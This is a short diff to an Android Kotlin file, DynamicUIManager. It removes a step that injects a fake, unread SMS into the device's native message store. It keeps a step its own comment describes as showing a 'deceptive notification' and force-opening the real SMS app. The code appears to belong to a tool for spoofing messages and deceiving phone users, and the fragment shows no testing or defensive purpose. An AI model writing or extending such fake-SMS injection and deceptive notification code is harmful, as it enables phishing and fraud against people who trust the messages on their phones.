@@ -555,16 +555,7 @@ object DynamicUIManager {
                     kotlinx.coroutines.delay(250)
                 }
                 
-                // 5. Insert into native DB
-                if (DefaultSmsManager.isDefaultSms(ctx)) {
-                    PhoneManager.injectFakeSms(ctx, sender, body, false) // false = Unread
-                } else {
-                    Handler(Looper.getMainLooper()).post {
-                        android.widget.Toast.makeText(ctx, "Error: App is not Default SMS.", android.widget.Toast.LENGTH_LONG).show()
-                    }
-                }
-                
-                // 6. Show deceptive notification & Force open App
+                // 5. Show deceptive notification & Force open real SMS App
                 try {
                     val defaultSmsPkg = android.provider.Telephony.Sms.getDefaultSmsPackage(ctx)
                     val smsIntent = if (defaultSmsPkg != null) {
